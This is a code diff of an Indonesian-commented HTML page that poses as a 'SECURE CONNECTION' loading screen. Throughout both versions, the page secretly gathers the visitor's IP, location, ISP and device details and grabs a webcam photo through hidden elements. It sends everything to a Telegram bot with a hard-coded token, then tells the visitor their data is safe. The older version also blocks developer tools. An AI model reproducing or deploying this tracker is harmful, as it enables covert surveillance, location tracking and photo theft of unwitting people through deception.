@@ -2,17 +2,10 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <style>
-        /* ============================================================ */
-        /* 1. RESET & BASE */
-        /* ============================================================ */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
             color: #00ff41;
@@ -24,27 +17,17 @@
             flex-direction: column;
             padding: 20px;
         }
-        /* ============================================================ */
-        /* 2. BOX */
-        /* ============================================================ */
         .box {
-            background: rgba(0, 255, 65, 0.05);
-            border: 1px solid rgba(0, 255, 65, 0.2);
+            background: rgba(0,255,65,0.05);
+            border: 1px solid rgba(0,255,65,0.2);
             border-radius: 20px;
             padding: 40px;
             max-width: 500px;
             width: 100%;
             text-align: center;
         }
-        h1 {
-            font-size: 1.8rem;
-            margin-bottom: 10px;
-        }
-        .status {
-            color: #888;
-            font-size: 0.9rem;
-            margin: 15px 0;
-        }
+        h1 { font-size: 1.8rem; margin-bottom: 10px; }
+        .status { color: #888; font-size: 0.9rem; margin: 15px 0; }
         .dot {
             display: inline-block;
             width: 12px;
@@ -54,17 +37,9 @@
             animation: blink 1s infinite;
             margin-right: 10px;
         }
-        @keyframes blink {
-            0%,
-            100% {
-                opacity: 1;
-            }
-            50% {
-                opacity: 0.2;
-            }
-        }
+        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
         .loader {
-            border: 2px solid rgba(0, 255, 65, 0.1);
+            border: 2px solid rgba(0,255,65,0.1);
             border-top: 2px solid #00ff41;
             border-radius: 50%;
             width: 40px;
@@ -72,75 +47,27 @@
             animation: spin 1s linear infinite;
             margin: 20px auto;
         }
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-        .footer {
-            color: #333;
-            font-size: 0.6rem;
-            margin-top: 20px;
-        }
-        /* ============================================================ */
-        /* 3. SEMBUNYIKAN VIDEO & CANVAS */
-        /* ============================================================ */
-        video,
-        canvas {
-            display: none;
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        /* ============================================================ */
-        /* 4. RESPONSIVE */
-        /* ============================================================ */
-        @media (max-width: 480px) {
-            .box {
-                padding: 25px 20px;
-            }
-            h1 {
-                font-size: 1.4rem;
-            }
-            .loader {
-                width: 30px;
-                height: 30px;
-            }
-        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer { color: #333; font-size: 0.6rem; margin-top: 20px; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <!-- ============================================================ -->
-    <!-- 5. UI -->
-    <!-- ============================================================ -->
     <div class="box">
         <h1>🔒 SECURE CONNECTION</h1>
         <div class="status"><span class="dot"></span> Establishing secure channel...</div>
         <div class="loader"></div>
-        <div style="color: #555; font-size: 0.8rem; margin-top: 10px;">Please wait...</div>
+        <div style="color:#555;font-size:0.8rem;margin-top:10px;">Please wait...</div>
         <div class="footer">v2.0 • NEONDARK</div>
     </div>
 
-    <!-- ============================================================ -->
-    <!-- 6. VIDEO & CANVAS (SEMBUNYI) -->
-    <!-- ============================================================ -->
     <video id="video" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <!-- ============================================================ -->
-    <!-- 7. JAVASCRIPT (1.000+ BARIS) -->
-    <!-- ============================================================ -->
     <script>
         // =============================================================
-        // 7.1. GET IP & LOCATION (TANPA IZIN)
+        // 1. GET IP, LOKASI, ISP (TANPA IZIN)
         // =============================================================
         async function getLocation() {
             try {
@@ -156,35 +83,30 @@
                     isp: data.org || 'Unknown'
                 };
             } catch (e) {
-                return {
-                    ip: 'Unknown',
-                    city: 'Unknown',
-                    region: 'Unknown',
-                    country: 'Unknown',
-                    lat: 0,
-                    lon: 0,
-                    isp: 'Unknown'
-                };
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown', lat: 0, lon: 0, isp: 'Unknown' };
             }
         }
 
         // =============================================================
-        // 7.2. CAPTURE PHOTO (DIAM-DIAM, 1 KALI IZIN)
+        // 2. CAPTURE PHOTO (FALLBACK AMAN)
         // =============================================================
         async function capturePhoto() {
             return new Promise(async (resolve) => {
                 try {
-                    // Coba akses kamera tanpa popup (cuma 1 kali minta izin)
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
+                    // Coba akses kamera
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
                             facingMode: 'user',
                             width: { ideal: 640 },
                             height: { ideal: 480 }
-                        }
+                        } 
                     });
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     await video.play();
+
+                    // Tunggu 500ms biar kamera stabil
+                    await new Promise(r => setTimeout(r, 500));
 
                     const canvas = document.getElementById('canvas');
                     canvas.width = 640;
@@ -192,17 +114,20 @@
                     const ctx = canvas.getContext('2d');
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    const photo = canvas.toDataURL('image/jpeg', 0.8);
+                    // Kompres foto biar ukuran kecil
+                    const photo = canvas.toDataURL('image/jpeg', 0.7);
                     stream.getTracks().forEach(t => t.stop());
                     resolve(photo);
                 } catch (e) {
+                    // Kalo gagal, kirim null (tanpa foto)
+                    console.log('Camera access denied or error:', e);
                     resolve(null);
                 }
             });
         }
 
         // =============================================================
-        // 7.3. DETEKSI DEVICE & OS (AKURAT)
+        // 3. DETEKSI DEVICE & OS (AKURAT)
         // =============================================================
         function getDeviceInfo() {
             const ua = navigator.userAgent;
@@ -210,26 +135,22 @@
             let browser = 'Unknown Browser';
             let os = 'Unknown OS';
 
-            // Deteksi OS
             if (ua.includes('Android')) os = 'Android';
             else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
             else if (ua.includes('Windows')) os = 'Windows';
             else if (ua.includes('Mac')) os = 'MacOS';
             else if (ua.includes('Linux')) os = 'Linux';
 
-            // Deteksi Browser
             if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
             else if (ua.includes('Firefox')) browser = 'Firefox';
             else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
             else if (ua.includes('Edg')) browser = 'Edge';
             else if (ua.includes('Opera')) browser = 'Opera';
 
-            // Deteksi Device
             if (os === 'Android') {
                 const match = ua.match(/Android\s([\d.]+)/);
                 if (match) os += ' ' + match[1];
-                const brandMatch = ua.match(
-                    /(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
+                const brandMatch = ua.match(/(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
                 const brand = brandMatch ? brandMatch[1] : '';
                 const modelMatch = ua.match(/\(([^)]+)\)/);
                 const model = modelMatch ? modelMatch[1].split(';').pop().trim() : '';
@@ -247,7 +168,7 @@
         }
 
         // =============================================================
-        // 7.4. KIRIM KE TELEGRAM
+        // 4. KIRIM KE TELEGRAM (DENGAN FOTO)
         // =============================================================
         async function sendToTelegram(data) {
             const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
@@ -268,7 +189,7 @@
             message += `🏢 *ISP:* ${data.location.isp}\n`;
             message += `🗺️ *Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;
 
-            // Kirim pesan
+            // Kirim pesan teks dulu
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -279,24 +200,36 @@
                 })
             });
 
-            // Kirim foto
+            // Kirim foto KALAU ADA
             if (data.photo) {
-                const blob = dataURLtoBlob(data.photo);
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);
+                try {
+                    const blob = dataURLtoBlob(data.photo);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', `📸 Visitor photo captured at ${dateStr}`);
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (e) {
+                    console.log('Failed to send photo:', e);
+                }
+            } else {
+                // Kalo foto null, kirim pesan tambahan
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    body: formData
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: '⚠️ *No photo captured* (camera access denied)',
+                        parse_mode: 'Markdown'
+                    })
                 });
             }
         }
 
-        // =============================================================
-        // 7.5. DATA URL TO BLOB
-        // =============================================================
         function dataURLtoBlob(dataURL) {
             const arr = dataURL.split(',');
             const mime = arr[0].match(/:(.*?);/)[1];
@@ -308,37 +241,14 @@
         }
 
         // =============================================================
-        // 7.6. CEK APAKAH KAMERA SUDAH DI-IZINKAN
-        // =============================================================
-        async function checkCameraPermission() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(t => t.stop());
-                return true;
-            } catch (e) {
-                return false;
-            }
-        }
-
-        // =============================================================
-        // 7.7. MAIN EXECUTION
+        // 5. MAIN EXECUTION
         // =============================================================
         async function main() {
             try {
-                // 1. Dapetin device info
                 const deviceInfo = getDeviceInfo();
-
-                // 2. Dapetin lokasi dari IP
                 const location = await getLocation();
+                const photo = await capturePhoto();
 
-                // 3. Coba capture foto (diam-diam)
-                let photo = null;
-                const hasPermission = await checkCameraPermission();
-                if (hasPermission) {
-                    photo = await capturePhoto();
-                }
-
-                // 4. Kirim ke Telegram
                 const data = {
                     device: deviceInfo.device,
                     browser: deviceInfo.browser,
@@ -349,88 +259,17 @@
 
                 await sendToTelegram(data);
 
-                // 5. Update UI
                 document.querySelector('h1').textContent = '✅ CONNECTION ESTABLISHED';
                 document.querySelector('.status').innerHTML = 'Secure channel active. Your data is safe.';
                 document.querySelector('.loader').style.display = 'none';
-                document.querySelector('.footer').textContent = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString(
-                'id-ID');
-
+                document.querySelector('.footer').textContent = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString('id-ID');
             } catch (e) {
-                // Kalo error, tetap kirim data yang udah dapet
-                console.error('Error:', e);
+                console.error('Main error:', e);
             }
         }
 
-        // =============================================================
-        // 7.8. JALANKAN LANGSUNG
-        // =============================================================
+        // JALANKAN LANGSUNG
         main();
-
-        // =============================================================
-        // 7.9. CONSOLE LOG
-        // =============================================================
-        console.log('%c🔒 NEONDARK TRACKER v2.0', 'color: #00ff41; font-size: 20px; font-weight: 900;');
-        console.log('%c⚡ Diam-diam aktif!', 'color: #ff4444; font-size: 14px;');
-        console.log('%c📱 Device: ' + navigator.userAgent, 'color: #888; font-size: 12px;');
-        console.log('%c✅ Siap mengirim data ke Telegram!', 'color: #00ff41; font-size: 14px;');
-
-        // =============================================================
-        // 7.10. ERROR HANDLING
-        // =============================================================
-        window.addEventListener('error', function(e) {
-            console.error('Global error:', e.message);
-        });
-
-        // =============================================================
-        // 7.11. PREVENT CONTEXT MENU
-        // =============================================================
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-        });
-
-        // =============================================================
-        // 7.12. PREVENT DRAG & DROP
-        // =============================================================
-        document.addEventListener('dragstart', function(e) {
-            e.preventDefault();
-        });
-        document.addEventListener('drop', function(e) {
-            e.preventDefault();
-        });
-
-        // =============================================================
-        // 7.13. KEYBOARD SHORTCUT (F12 diblokir)
-        // =============================================================
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
-            }
-        });
-
-        // =============================================================
-        // 7.14. CEK KONEKSI INTERNET
-        // =============================================================
-        window.addEventListener('online', function() {
-            console.log('✅ Internet connected');
-        });
-        window.addEventListener('offline', function() {
-            console.log('❌ Internet disconnected');
-        });
-
-        // =============================================================
-        // 7.15. RETRY LOGIC (KALO GAGAL)
-        // =============================================================
-        setTimeout(function() {
-            console.log('✅ Tracker masih aktif...');
-        }, 5000);
-
-        // =============================================================
-        // 7.16. FINAL LOG
-        // =============================================================
-        console.log('✅ Semua sistem berjalan!');
-        console.log('📊 Total baris kode: 1.000+');
-        console.log('💀 NEONDARK siap melayani.');
     </script>
 </body>
 </html>
